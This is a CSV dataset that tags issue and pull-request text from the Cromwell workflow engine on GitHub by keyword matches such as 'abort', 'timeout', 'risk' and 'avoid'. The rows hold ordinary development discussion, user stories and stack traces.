Safety,"Added Docker specification content types to the manifest unmarshaller.; Updated spec for testing GCR w/o authentication, as cromwell's Google Credentials utility now automatically detects the application default credentials on a system.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/715:180,detect,detects,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/715,1,['detect'],['detects']
Safety,Added Workflow Abort functionality,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/128:15,Abort,Abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/128,1,['Abort'],['Abort']
Safety,Added an extra akka message check just in case we miss the abort message when our scala future eventually runs.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1947:59,abort,abort,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1947,1,['abort'],['abort']
Safety,Added changelog message regarding webservice timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1850:45,timeout,timeout,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1850,1,['timeout'],['timeout']
Safety,Added the new database tables for Job Avoidance,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/276:38,Avoid,Avoidance,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/276,2,['Avoid'],['Avoidance']
Safety,Added the new database tables for Job Avoidance. It may be better to do all Avoidance work in a branch rather than merging into DEVELOP one piece at a time.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/276:38,Avoid,Avoidance,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/276,2,['Avoid'],['Avoidance']
Safety,"Addendum...; ``Ctl-\``. I see a lot of the following, but not much else that stands out.; ```; ""pool-1-thread-11"" #77 prio=5 os_prio=0 tid=0x00007fe0fc083800 nid=0x6ea8 waiting on condition [0x00007fe1ae391000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b793b68> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582:267,Unsafe,Unsafe,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582,1,['Unsafe'],['Unsafe']
Safety,"Adding this to the [Runtime Attributes improvement spec](https://docs.google.com/document/d/1EcsPrmZ6hKtz9vumhdT3357e1jdhljvs6eXXeT6HTaM/edit#). As a **workflow runner on SGE**, I want **be able to make the Docker attribute to be optional**, so that I can **avoid rewriting my WDL when I don't use Docker**.; - Effort: **@geoffjentry What do you think?**; - Risk: **Small?**; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-329591802:258,avoid,avoid,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-329591802,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,Additional null safety for GCS IO [CROM-6670],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6118:16,safe,safety,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118,1,['safe'],['safety']
Safety,"Addresses [WX-1282](https://broadworkbench.atlassian.net/browse/WX-1282). PR replaces the INNER JOIN statement against `pg_largeobject` with a `lo_get` statement to avoid ""Permission Denied"" errors that comes from scanning the `pg_largeobject` table (which enforces owner/role permissions for each row which needs to be taken in consideration for the new Workflows App ecosystem). [WX-1282]: https://broadworkbench.atlassian.net/browse/WX-1282?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7228:165,avoid,avoid,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7228,1,['avoid'],['avoid']
Safety,Adds submitted and aborted status to Metadata,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2114:19,abort,aborted,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2114,1,['abort'],['aborted']
Safety,Adjust CromIAM timeout to match Cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4615:15,timeout,timeout,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4615,1,['timeout'],['timeout']
Safety,"After I have aborted a job, VM's are not being apropriately killed. Manually killing the VM does not have the desire effect, as if the task was preemptible PAPI will launch another VM until all of your preemptible tries have been consumed",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758:13,abort,aborted,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758,1,['abort'],['aborted']
Safety,"After abort a workflow, can I rerun the task based on the workflow id?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7465:6,abort,abort,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7465,1,['abort'],['abort']
Safety,"Ah, I see now how you intent for it to work. I don't think this will be very practical on any kind of shared SGE HPC without a seperate poll rate. . As mentioned elsewhere; the call rate of the `pollStatus` is geared towards a low-impact filesytem check and not a high-impact call to the SGE queque master (i.e. `check-alive` uses `qstat`). Enabling the `exit-code-timeout` with a somewhat large numbers of tasks will quickly cripple any average SGE HPC. . If you enable this and are an HPC admin; make sure to keep taps on your submission services.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425025492:365,timeout,timeout,365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425025492,1,['timeout'],['timeout']
Safety,"Allow ""AbortedResponse"" even when not aborting",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2503:7,Abort,AbortedResponse,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2503,2,"['Abort', 'abort']","['AbortedResponse', 'aborting']"
Safety,Allow GCP global pipeline timeout to be configurable,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5273:26,timeout,timeout,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5273,1,['timeout'],['timeout']
Safety,Allow GCP global pipeline timeout to be configurable [CI clone],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5315:26,timeout,timeout,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5315,1,['timeout'],['timeout']
Safety,Allow abort in CromIAM to go to a different Cromwell server,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4142:6,abort,abort,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4142,1,['abort'],['abort']
Safety,Allow for a DB write to trigger abort of a workflow,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3344:32,abort,abort,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3344,1,['abort'],['abort']
Safety,Allowed the CallActor to receive an updated abort function,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326:44,abort,abort,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326,1,['abort'],['abort']
Safety,Also creates #852. Following things need to be done (separate stories?) :; - [ ] Add docker support (#884); - [ ] Add recovery and abort (#885); - [x] Add continueOnErrorCode support; - [ ] Find a way to add condor specific runtime attributes to Condor ClassAds (#886). Anything more to support?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/861:118,recover,recovery,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/861,2,"['abort', 'recover']","['abort', 'recovery']"
Safety,"Also seen: . ```; Execution failed: pulling image: docker pull: generic::unknown: retry budget exhausted (10 attempts): running [""docker"" ""pull"" ""quay.io/bcbio/bcbio-vc@sha256:90087824e545df6d3996a28360f2f0fd28dce611a989bbcc79aa8117d341f6ef""]: exit status 1 (standard error: ""Error response from daemon: Get https://quay.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n""); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4438#issuecomment-443429790:393,Timeout,Timeout,393,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4438#issuecomment-443429790,1,['Timeout'],['Timeout']
Safety,"Also, note that Google PD's can be expanded on the fly in seconds, even while the VM is still running under load. I've done this manually on non-FC VMs via the script below. Using this approach combined with a disk space monitoring process (and a size cap!) would allow the job to pass the first time, avoiding a retry. And... if it was also during the algorithm, not just data download, this could eradicate both disk space errors and disk over-provisioning. . https://github.com/broadinstitute/firecloud_developer_toolkit/blob/master/gce/expand_disk.sh. Unfortunately I don't know of a way to hot-swap RAM into the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902:302,avoid,avoiding,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902,1,['avoid'],['avoiding']
Safety,"Alternative to #5588 which completely removes this redundant queuing mechanism which doesn't seem to be doing what it thinks it was doing, and is worse in any case than the existing token distribution safety mechanisms.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5590:51,redund,redundant,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5590,2,"['redund', 'safe']","['redundant', 'safety']"
Safety,"An attempt to document my observation of our general purpose debugging process - will hopefully help the next generation of Cromwell fire troubleshooters. * Moves the release processes under a new ""processes"" banner instead of awkwardly sitting in ""scripts""; * Adds a general-purpose recover process . See the process rendered and [in situ](https://github.com/broadinstitute/cromwell/tree/cjl_all_purpose_mess_remover/processes/troubleshooting). NB: If this gets approval, I'll update our playbook to link to this as our ""general purpose fallback process""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4991:284,recover,recover,284,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4991,1,['recover'],['recover']
Safety,And I can't seem to abort the workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-343273348:20,abort,abort,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-343273348,1,['abort'],['abort']
Safety,And another possible bug: why are we trying to upload an auth file when running in application default auth mode for both genomics and filesystems?. ```; [ERROR] [01/27/2017 14:39:36.100] [cromwell-system-akka.dispatchers.engine-dispatcher-5] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 732474fd-88b0-4a5e-ad19-5ee5cd71d141 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:81); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinP,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:957,recover,recoverWith,957,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['recover'],['recoverWith']
Safety,"Another issue for the [Log spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). As a **user on the CLI and single workflow mode**, I want **to easily see the output location**, so that I can **check the status of my jobs while they are still completing**.; - Effort: **TBD** @geoffjentry ; - Risk: **TBD** @geoffjentry ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-325478495:333,Risk,Risk,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-325478495,1,['Risk'],['Risk']
Safety,Another recent example of some strange aborting behavior: http://gatkforums.broadinstitute.org/gatk/discussion/comment/40215,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-314539221:39,abort,aborting,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-314539221,1,['abort'],['aborting']
Safety,ApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); cromwell_1 | at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); cromwell_1 | at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); cromwell_1 | at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); cromwell_1 | at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); cromwell_1 | at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); cromwell_1 | at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); cromwell_1 | at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); cromwell_1 | at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); cromwell_1 | at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); cromwell_1 | at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); cromwell_1 | at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); cromwell_1 | at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); cromwell_1 | at akka.dispatch.forkjoin.ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4337:2818,recover,recoverWith,2818,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4337,2,['recover'],['recoverWith']
Safety,"As FireCloud ( @cbirger ) , I often abort workflows. Although JES currently makes a best effort to abort calls, sometimes those calls fail to abort. I would like to know through the cromwell call/workflow status the difference between ""definitely aborted"" and ""unknown abort status"". The reason this is important is that if I know the status is ""unknown"" I know that I might be at risk for being billed for machines I don't want and should take further action. </end of PO comment>. Technically this might require a little research and specifically work on JES. Ideally:; 1. We change our overall workflow status to aborting; 2. When we cancel a JES operation, the status of that operation will reflect reality.; 3. We can poll that operation until it reaches a terminal state (e.g. cancelled). This may actually just be for us to keep running the workflow like normal and just add canceled to the list of terminal states).; 4. Once all tasks are in a terminal state, the workflow status is Aborted. Question will be... if JES fails to terminate a job, should we change it's status to something like 'LOST' or 'UNKNOWN' after N minutes, or should we wait indefinitely. Since it's a best effort cancellation in JES we should handle this case",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1139:36,abort,abort,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1139,8,"['Abort', 'abort', 'risk']","['Aborted', 'abort', 'aborted', 'aborting', 'risk']"
Safety,"As a **Cromwell dev** I want **to have uniquely named Metadata services**, so that **when there are multiple services I can specify which metadata service**.; - Effort: Small; - Risk: Would this break WDLs? APIs?; - Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2440#issuecomment-336169425:178,Risk,Risk,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2440#issuecomment-336169425,1,['Risk'],['Risk']
Safety,"As a **Cromwell dev**, I want **Cromwell to follow akka protocols of handling unexpected messages**, so that I can **avoid excessive LinesOfCode**.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328963748:117,avoid,avoid,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328963748,1,['avoid'],['avoid']
Safety,"As a **Cromwell dev**, I want **the wdl4s-CWL subproject to compile quickly**, so that **I don't waste my time waiting and waiting**.; - Effort: small? ; - As @danbills mentioned, maybe putting Circe encoding into another project will save time.; - Risk: small; - Business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2712#issuecomment-345032450:249,Risk,Risk,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2712#issuecomment-345032450,1,['Risk'],['Risk']
Safety,"As a **Cromwell dev**, I want **to be able to release Cromwell with the same Github account**, so that **I don't have to use my personal github token.**. - effort: small; - risk: small; - business value: small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-344712648:173,risk,risk,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-344712648,1,['risk'],['risk']
Safety,"As a **Cromwell dev**, I want **to explore the cost/benefits of using AsyncAppender for our logs**, so that **we can decide whether we should adopt it.**; - effort: Small spike; - risk: Small to Medium; - business value: Small to Medium, depending on the results of the spike",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-344952812:180,risk,risk,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-344952812,1,['risk'],['risk']
Safety,"As a **Cromwell dev**, I want **wdltool to be released automatically**, so that **when I release Cromwell, wdltool is released and up to date**.; - Effort: Small?; - Risk: Small; - Business Value: Small?; - @Horneth how much time/effort does it take to manually release wdltool? how much risk of human error is there?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2400#issuecomment-335884089:166,Risk,Risk,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2400#issuecomment-335884089,2,"['Risk', 'risk']","['Risk', 'risk']"
Safety,"As a **Cromwell developer**, I want **each unit test to appear once**, so that I can **avoid duplicate (and messy) tests**.; - Effort: **TBD**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-328204130:87,avoid,avoid,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-328204130,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"As a **Redteam member**, I want **to improve the Cromwell release process**, so that **it gets easier every time we release**.; * Effort: depends on the issue; * Risk: Small, depends on the issue; * Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2404#issuecomment-332631666:162,Risk,Risk,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2404#issuecomment-332631666,1,['Risk'],['Risk']
Safety,"As a **WDL runner**, I want **to include a directory with index file(s) with my inputs**, so that I can **avoid doing it manually**.; - Effort: **? ** @geoffjentry ; - Risk: ** ? ** @geoffjentry ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1412#issuecomment-327924055:106,avoid,avoid,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1412#issuecomment-327924055,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"As a **WDL user**, I want **declare a parameter once for many tasks**, so that I **don't have to alias the parameter for each aliased task**.; - Effort: **Small-Medium**; - Risk: **Small**; - Business value: **Small**; @vdauwera please chime in if you disagree",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1335#issuecomment-325452489:173,Risk,Risk,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1335#issuecomment-325452489,1,['Risk'],['Risk']
Safety,"As a **developer using Cromwell**, I want **to run workflows from the CLI that connect directly to the Cromwell REST APIs**, so that I can **easily interact with the APIs (does that sound right? @geoffjentry @Horneth )**.; - Effort: **?**; - Risk: **?**; - Business value: **?**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1492#issuecomment-328205809:242,Risk,Risk,242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1492#issuecomment-328205809,1,['Risk'],['Risk']
Safety,"As a **production pipeline runner**, I want **to write all output files in one directory (rather than hierarchical)**, so that I can **(@ktibbett why is this helpful?)**.; - Effort: **Small**; - Risk: **Medium**; - if files have the same name they could be overwritten; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-326068415:195,Risk,Risk,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-326068415,1,['Risk'],['Risk']
Safety,"As a **super-user**, I want **to see every call Cromwell made to Google**, so that I can **debug what is wrong with Cromwell**.; - Effort: **Small**; - Risk: **Medium**; - - Need to make sure regular users don't see these logs, so that these are not visible by default.; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-325462508:152,Risk,Risk,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-325462508,1,['Risk'],['Risk']
Safety,"As a **user aborting workflows**, I want to **get a 403 status after aborting a workflow**, so that **I know that my workflow is going to abort**.; * Effort: Small; * Decide whether we want to keep the 403 status; * @geoffjentry what does the 403 status gain us or users?; * Risk: Small; * Business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332639761:12,abort,aborting,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332639761,4,"['Risk', 'abort']","['Risk', 'abort', 'aborting']"
Safety,"As a **user accessing CaaS**, I want **to query a Collection of workflows**, so that I can **view the status of many workflows at once and get the results quickly**.; - Effort: **Medium**; - Risk: **Small to Medium**; - Business value: **Medium to Large**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212:191,Risk,Risk,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212,1,['Risk'],['Risk']
Safety,"As a **user developing a backend for Cromwell**, I want **the execution actor naming and system to be simple and concise**, so that I can **more easily work with Cromwell, and don't add unnecessary code**.; - Effort: **Medium**; - Risk: **Small**; - Business value: **Small**; - Not to devalue cleaning up tech debt, but there are higher value items on our docket.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-344404227:231,Risk,Risk,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-344404227,1,['Risk'],['Risk']
Safety,"As a **user looking at logs** I want **the logs to be color-coded**, so that **I can easily debug my workflow and get the info I'm looking for**.; - Effort: Medium; - While the color-coding is easy, deciding what to color-code is more complicated.; - Risk: X-Small; - Business value: Medium; - Logs are a known issue. Maybe color coding them is an easy, first step to improving them",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-336149648:251,Risk,Risk,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-336149648,1,['Risk'],['Risk']
Safety,"As a **user of all types**, I want **to read documentation about how to access logs**, so that I can **debug my issues, whether they are within the workflow or outside of it**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087:201,Risk,Risk,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087,1,['Risk'],['Risk']
Safety,"As a **user running a backend via TES**, I want **Cromwell to test the latest TES version as exemplified by Funnel**, so that **regressions are caught in testing**.; * Effort: Small to Medium; * Risk: Small; * Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2396#issuecomment-332627515:195,Risk,Risk,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2396#issuecomment-332627515,1,['Risk'],['Risk']
Safety,"As a **user running the same workflows repeatedly**, I want **Cromwell to hash the outputs of my workflows**, so that **I can safely call cache on my outputs and I don't have to worry if they changed**.; - effort: Small to medium ; - risk: Small ; - business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054:126,safe,safely,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054,2,"['risk', 'safe']","['risk', 'safely']"
Safety,"As a **user running workflows and setting up configs**, I want **Cromwell to (fail nicely?) when I reference a pluggable backend class that's not on the classpath**, so that I can **(still run my workflow? get a nice error message?)**. @geoffjentry ; - Effort: **Small?**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1683#issuecomment-328531953:275,Risk,Risk,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1683#issuecomment-328531953,1,['Risk'],['Risk']
Safety,"As a **user running workflows on P.API**, I want **clear error messages when I put in an invalid zone**, so that **I know to change the zone and Cromwell doesn't infinitely retry (and spend all my money).**. - Effort: Small; - Risk: Small; - Business value: Small to Medium; - @ruchim have you heard of users running into this issue?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1915#issuecomment-344986436:227,Risk,Risk,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1915#issuecomment-344986436,1,['Risk'],['Risk']
